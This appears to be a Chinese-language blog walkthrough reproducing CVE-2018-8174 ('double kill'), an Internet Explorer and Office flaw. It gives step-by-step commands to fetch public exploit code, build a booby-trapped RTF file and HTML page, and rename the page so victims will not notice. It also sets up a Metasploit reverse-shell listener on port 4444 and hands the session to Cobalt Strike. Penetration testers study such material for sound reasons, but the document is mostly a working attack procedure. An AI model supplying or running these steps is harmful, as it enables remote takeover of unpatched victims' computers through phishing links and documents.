**目录**

[CVE-2018-8174双杀漏洞复现一(不稳定)](#t0 "CVE-2018-8174双杀漏洞复现一(不稳定)")

[下载payload](#t1 "下载payload")

[MSF监听](#t2 "MSF监听")

[CVE-2018-8174双杀漏洞复现二](#t3 "CVE-2018-8174双杀漏洞复现二")

[生成payload](#t4 "生成payload")

[MSF监听](#MSF%E7%9B%91%E5%90%AC "MSF监听")

[派生给CS](#t5 "派生给CS")

* * *

双杀漏洞攻击是一种新型的IE浏览器0day漏洞和新型Office文档漏洞。该漏洞影响最新版本的IE浏览器及使用了IE内核的应用程序。用户在浏览网页或打开Office文档时都可能中招，最终被黑客植入后门[木马](https://so.csdn.net/so/search?q=%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020)完全控制电脑。该漏洞最早是由360追日团队于2018年4月捕获到的，微软在4月20号也确认了此漏洞，并在5月8号发布了官方补丁。

**漏洞影响版本：**

CVE-2018-8174双杀漏洞复现一(不稳定)
-------------------------

### 下载payload

```
git clone https://github.com/0x09AL/CVE-2018-8174-msf.git  #下载CVE-2018-8174到本地      
#进入该目录      
cp CVE-2018-8174.rb /usr/share/metasploit-framework/modules/exploits/windows/fileformat/  #复制rb文件      
cp CVE-2018-8174.rtf /usr/share/metasploit-framework/data/exploits/    #复制rtf文件
```


![](https://img-blog.csdnimg.cn/20190813103616972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### MSF监听

**注意：如果是使用公网的VPS监听，则 lhost 要设置为 0.0.0.0**

注意这里的payload必须设置成shell类型的payload，而不能是meterpreter类型的payload。

然后只要受害者使用IE浏览器访问了我们的链接：http://192.168.10.11:8080 ，或者是受害者打开了我们生成的 msf.rtf 文件，我们的MSF就能接收到其弹回来的session了。但是由于这个payload不稳定，导致虽然受害者点击了我们的恶意链接，我们也在攻击成功了，但是还是没有创建成功session。

![](https://img-blog.csdnimg.cn/2019081310453679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

CVE-2018-8174双杀漏洞复现二
--------------------

### 生成payload

```
git clone https://github.com/Yt1g3r/CVE-2018-8174_EXP.git    #下载CVE-2018-8174python攻击脚本      
进入该目录，执行以下命令      
python CVE-2018-8174.py -u http://192.168.10.11/test.html -o test.rtf -i 192.168.10.11 -p 4444   #http://192.168.10.11/test.html就是待会要给受害者访问的链接，-i 192.168.10.11 是我们的MSF的监听地址，-p 4444是我们的MSF监听的端口      
#执行完该命令后，默认会生成exploit.html文件和我们指定的test.rtf文件，我们需要将exploit.html文件重命名为 test.html文件，这样就不容易被受害者发现      
cp exploit.html test.html      
#然后利用python在本地搭建起http服务，让受害者可以访问到test.html文件      
python -m SimpleHTTPServer 80
```


![](https://img-blog.csdnimg.cn/20190813100654892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### MSF监听

注意这里的payload必须设置成shell类型的payload，而不能是meterpreter类型的payload。

然后只要受害者使用IE浏览器访问了我们的链接：http://192.168.10.11/test.html ，或者是受害者打开了我们生成的 test.rtf 文件，我们的MSF就能接收到其弹回来的session了

```
use exploit/multi/handler      
set payload windows/shell/reverse_tcp   #注意这里只能设置为shell类型的payload，而不能是meterpreter类型的payload      
set lhost 192.168.10.11      
set lport 4444      
exploit -j
```


![](https://img-blog.csdnimg.cn/20190813101338626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

派生给CS
-----

由于弹回来的是shell类型的session，不好操作，所以我们可以执行命令，派生给CS。

![](https://img-blog.csdnimg.cn/20190813102059959.png)

![](https://img-blog.csdnimg.cn/20190813102043222.png)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

相关漏洞：[CVE-2019-1367](https://baijiahao.baidu.com/s?id=1645673843575905491&wfr=spider&for=pc "CVE-2019-1367")

                  [360安全大脑关于微软Win7系统IE远程执行漏洞利用](http://www.360.cn/n/11481.html "360安全大脑关于微软Win7系统IE远程执行漏洞利用")

                  [Microsoft IE jscript远程命令执行0day漏洞（CVE-2020-0674）通告](https://ti.qianxin.com/advisory/articles/microsoft-ie-jscript-remote-command-execution-0day-vulnerability-cve-2020-0674-Notice/ "Microsoft IE jscript远程命令执行0day漏洞（CVE-2020-0674）通告")

                  [Darkhotel（APT-C-06）使用“双星”0Day漏洞（CVE-2019-17026、CVE-2020-0674）针对中国发起的APT攻击分析](http://blogs.360.cn/post/apt-c-06_0day.html "Darkhotel（APT-C-06）使用“双星”0Day漏洞（CVE-2019-17026、CVE-2020-0674）针对中国发起的APT攻击分析")